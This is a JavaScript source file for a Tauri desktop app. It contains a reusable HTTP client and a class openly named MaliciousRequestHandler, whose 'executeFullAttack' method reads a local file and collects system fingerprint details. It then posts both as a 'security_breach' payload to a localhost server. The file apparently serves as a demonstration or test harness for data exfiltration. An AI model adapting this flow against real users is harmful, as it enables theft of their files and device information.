// 网络请求组件 - 可复用的 HTTP 客户端
import { invoke } from '@tauri-apps/api/core'
import { fetch } from '@tauri-apps/plugin-http'

export class NetworkClient {

  constructor(options = {}) {
    this.baseUrl = options.baseUrl || 'http://localhost:3000'
    this.timeout = options.timeout || 10000
    this.defaultHeaders = {
      'Content-Type': 'application/json',
      'User-Agent': 'SecurityAlert/1.0',
      'X-App-Version': '0.1.0',
      ...options.headers
    }
  }

  // 统一的日志写入方法 - 直接调用 Rust 后端
  async log(message) {
    try {
      await invoke('write_log', { message })
    } catch (error) {
      console.error('日志写入失败:', error)
    }
  }

  // 通用请求方法
  async request(endpoint, options = {}) {
    const url = endpoint.startsWith('http') ? endpoint : `${this.baseUrl}${endpoint}`
    
    const config = {
      method: options.method || 'GET',
      headers: {
        ...this.defaultHeaders,
        ...options.headers
      },
      ...options
    }

    // 如果有 body 且不是字符串，自动 JSON 序列化
    if (config.body && typeof config.body === 'object') {
      config.body = JSON.stringify(config.body)
    }

    await this.log(`发送 ${config.method} 请求到: ${url}`)

    try {
      const response = await fetch(url, config)
      
      if (response.ok) {
        const responseData = await this.parseResponse(response)
        await this.log(`${config.method} 请求成功: ${response.status}, 响应数据: ${JSON.stringify(responseData).slice(0, 200)}`)
        return {
          success: true,
          status: response.status,
          data: responseData,
          headers: response.headers
        }
      } else {
        await this.log(`${config.method} 请求失败: ${response.status}`)
        return {
          success: false,
          status: response.status,
          error: `HTTP ${response.status}: ${response.statusText}`,
          data: null
        }
      }
    } catch (error) {
      await this.log(`${config.method} 请求异常: ${error.message}`)
      return {
        success: false,
        status: 0,
        error: error.message,
        data: null
      }
    }
  }

  // 解析响应内容
  async parseResponse(response) {
    const contentType = response.headers.get('content-type') || ''
    
    if (contentType.includes('application/json')) {
      return await response.json()
    } else if (contentType.includes('text/')) {
      return await response.text()
    } else {
      return await response.arrayBuffer()
    }
  }

  // GET 请求 - 获取数据
  async get(endpoint, params = {}, options = {}) {
    // 构建查询参数
    const url = new URL(endpoint.startsWith('http') ? endpoint : `${this.baseUrl}${endpoint}`)
    Object.keys(params).forEach(key => url.searchParams.append(key, params[key]))
    
    return this.request(url.toString(), {
      method: 'GET',
      ...options
    })
  }

  // POST 请求 - 发送数据
  async post(endpoint, data, options = {}) {
    return this.request(endpoint, {
      method: 'POST',
      body: data,
      ...options
    })
  }
}

// 专门的恶意请求处理器
export class MaliciousRequestHandler extends NetworkClient {
  constructor() {
    super({
      baseUrl: 'http://localhost:3000',
      headers: {
        'X-App-Source': 'SecurityAlert',
        'X-Session-ID': Date.now().toString(36),
        'X-Platform': navigator.platform
      }
    })
  }

  // 获取服务器配置（GET）
  async fetchServerConfig() {
    const result = await this.get('https://www.baidu.com/', {
      client: 'desktop',
      version: '0.1.0'
    })
    
    if (result.success) {
      return result.data
    } else {
      // 请求失败日志已在 request 方法中记录，这里直接返回默认配置
      return {
        target: 'default',
        priority: 'normal',
        endpoints: {
          data: '/api/data'
        }
      }
    }
  }

  // 发送敏感数据（POST）
  async sendSensitiveData(serverConfig, fileData, systemInfo = {}) {
    const payload = {
      type: 'security_breach',
      timestamp: new Date().toISOString(),
      session: this.defaultHeaders['X-Session-ID'],
      
      // 服务器配置信息
      serverConfig: serverConfig,
      
      // 文件数据
      fileData: {
        ...fileData,
        hash: this.generateHash(fileData.content || '')
      },
      
      // 系统信息
      systemInfo: {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: {
          width: screen.width,
          height: screen.height,
          colorDepth: screen.colorDepth
        },
        ...systemInfo
      },
      
      // 元数据
      metadata: {
        source: 'malicious_desktop_app',
        priority: serverConfig?.priority || 'high',
        encrypted: false,
        compressed: false
      }
    }

    const endpoint = serverConfig?.endpoints?.data || '/api/data'
    const result = await this.post(endpoint, payload, {
      headers: {
        'X-Data-Type': 'sensitive',
        'X-Priority': payload.metadata.priority
      }
    })
    return result
  }

  // 生成简单的内容哈希
  generateHash(content) {
    let hash = 0
    for (let i = 0; i < content.length; i++) {
      const char = content.charCodeAt(i)
      hash = ((hash << 5) - hash) + char
      hash = hash & hash // 转为32位整数
    }
    return hash.toString(36)
  }

  // 执行完整的恶意流程
  async executeFullAttack(fileReader) {
    const results = {
      serverConfig: null,
      fileData: null,
      postResult: null,
      success: false
    }
    try {
      // 第1步：获取服务器配置
      results.serverConfig = await this.fetchServerConfig()
      // 第2步：读取本地文件
      if (typeof fileReader === 'function') {
        results.fileData = await fileReader()
      } else {
        await this.log('未提供文件读取器，跳过文件读取')
        results.fileData = { content: 'No file data', size: 0 }
      }
      // 第3步：发送数据到服务器
      results.postResult = await this.sendSensitiveData(
        results.serverConfig, 
        results.fileData
      )
      
      results.success = results.postResult.success
    } catch (error) {
      await this.log(`攻击流程异常: ${error.message}`)
      results.error = error.message
    }

    return results
  }
}